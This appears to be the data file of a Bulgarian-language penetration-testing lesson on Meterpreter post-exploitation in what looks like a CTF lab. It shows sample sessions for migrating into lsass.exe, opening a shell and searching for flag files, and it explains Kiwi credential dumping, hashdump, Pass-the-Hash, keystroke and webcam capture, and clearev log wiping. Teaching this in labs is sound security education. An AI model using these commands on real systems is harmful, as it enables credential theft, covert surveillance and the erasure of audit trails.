        ["Файлова система", "cd сменя директорията; ls или dir изброява файлове; pwd показва текущата директория; cat показва файл; edit редактира файл; search търси; rm изтрива; upload и download прехвърлят файлове."],
        ["Мрежа", "arp показва ARP cache; ifconfig изброява интерфейсите; netstat показва мрежовите връзки; portfwd препраща локален порт към отдалечена услуга; route показва или променя routing table."],
        ["Система", "execute изпълнява команда; getpid показва PID; getuid показва потребителя; ps изброява процесите; kill и pkill прекратяват процеси; sysinfo показва системна информация; shell отваря обикновен command shell; reboot и shutdown рестартират или изключват системата."],
        ["Сесия", "background или Ctrl+Z връща към msfconsole, без да затваря сесията; sessions изброява активните; sessions -i <ID> отваря избраната сесия." ]
      ] },
      { type: "heading", text: "Проверка на потребител и процеси" },
      { type: "code", language: "Meterpreter · Windows", text: [
        "meterpreter > getuid",
        "Server username: NT AUTHORITY\\SYSTEM",
        "",
        "meterpreter > getpid",
        "Current pid: 1304",
        "",
        "meterpreter > ps",
        "PID   PPID  Name        Arch  User",
        "716   596   lsass.exe   x64   NT AUTHORITY\\SYSTEM",
        "1304  692   spoolsv.exe x64   NT AUTHORITY\\SYSTEM"
      ].join("\n") },
      { type: "paragraph", text: "PID е номерът на процеса, в който работи сесията. При migrate се подава PID на друг процес. Изборът на процес може да промени стабилността на сесията или потребителския контекст; ако се премине към процес с по-ниски права, наличните привилегии може да се променят." },
      { type: "code", language: "Meterpreter · Windows", text: [
        "meterpreter > migrate 716",
        "[*] Migrating from 1304 to 716...",
        "[*] Migration completed successfully."
      ].join("\n") },
      { type: "heading", text: "Търсене на файлове и отваряне на shell" },
      { type: "code", language: "Meterpreter · Windows", text: [
        "meterpreter > search -f flag2.txt",
        "Found 1 result...",
        "c:\\Windows\\System32\\config\\flag2.txt (34 bytes)",
        "",
        "meterpreter > shell",
        "Process 2124 created.",
        "Channel 1 created.",
        "C:\\Windows\\system32>"
      ].join("\n") },
      { type: "paragraph", text: "shell отваря обикновен команден ред на целевата система. Ctrl+Z може да върне управлението към Meterpreter prompt." },
      { type: "heading", text: "Допълнителни extensions" },
      { type: "paragraph", text: "Командата load добавя extensions и може да разшири менюто help. След зареждане изпълни help отново, за да видиш новите команди. Например load python добавя Python функции; учебният пример по-долу изпълнява безвреден print." },
      { type: "code", language: "Meterpreter · Windows", text: [
        "meterpreter > load python",
        "Loading extension python...Success.",
        "meterpreter > python_execute \"print 'Meterpreter example'\"",
        "[+] Content written to stdout:",
        "Meterpreter example",
        "",
        "meterpreter > load kiwi",
        "Loading extension kiwi...",
        "Success."
      ].join("\n") },
      { type: "paragraph", text: "Kiwi добавя команди за работа с credential и Kerberos данни. Сред тях са creds_all, creds_kerberos, creds_msv, creds_ssp, creds_tspkg, creds_wdigest, dcsync, dcsync_ntlm, golden_ticket_create, kerberos_ticket_list, kerberos_ticket_purge, kerberos_ticket_use, kiwi_cmd, lsa_dump_sam, lsa_dump_secrets, password_change, wifi_list и wifi_list_shared. Наличните команди зависят от платформата, правата и версията. Провери help след зареждането на extension." },
      { type: "heading", text: "Други команди, показани в help" },
      { type: "table", headers: ["Група", "Команди от материала"], rows: [
        ["User interface", "idletime показва времето на бездействие; keyscan_start, keyscan_stop и keyscan_dump управляват заснемането и показването на буфера от натискания на клавиши; screenshare и screenshot показват или заснемат работния плот."],
        ["Audio и webcam", "record_mic записва звук за зададен период; webcam_list изброява камерите; webcam_snap прави снимка; webcam_stream показва видео поток; webcam_chat стартира видео чат."],
        ["Elevate и password database", "getsystem опитва повишаване до Local System; hashdump извлича записи от Windows SAM database."],
        ["Системни логове", "clearev изчиства event logs и записите от системния журнал."]
      ] },
      { type: "paragraph", text: "Наличието на команда в help не означава, че тя ще работи във всяка среда. Например системата може да няма webcam или графична среда. Windows SAM database съхранява password hashes във формат NTLM. hashdump показва тези записи; Pass-the-Hash е техника, при която NTLM hash се използва за authentication без въвеждане на plaintext password." },
      { type: "heading", text: "Управление на сесии" },
      { type: "paragraph", text: "След установяване на връзка се създава session. background или Ctrl+Z връща към msfconsole, като оставя сесията активна. sessions -l изброява активните сесии, а sessions -i <ID> отваря избраната. sessions -h показва и опциите за взаимодействие, преименуване, прекратяване и изпълнение на команди върху сесии." },
      { type: "code", language: "Metasploit Console · Linux", text: [
        "meterpreter > background",
        "[*] Backgrounding session 2...",
        "msf6 > sessions -l",
        "Active sessions",
        "===============",
        "1  meterpreter x64/windows  NT AUTHORITY\\SYSTEM @ JON-PC",
        "2  meterpreter x64/windows  NT AUTHORITY\\SYSTEM @ JON-PC",
        "",
        "msf6 > sessions -i 2",
        "[*] Starting interaction with 2...",
        "meterpreter >"
      ].join("\n") },
      { type: "list", items: [
        "post-exploitation: събиране на допълнителна информация за целевата система.",
        "Проверка за интересни файлове, потребителски данни и мрежови интерфейси.",
        "Оценяване на възможностите за privilege escalation и lateral movement в разрешената среда.",
        "Използване на подходящи post-exploitation modules и extensions според задачата."
      ] }
    ]
  }
];
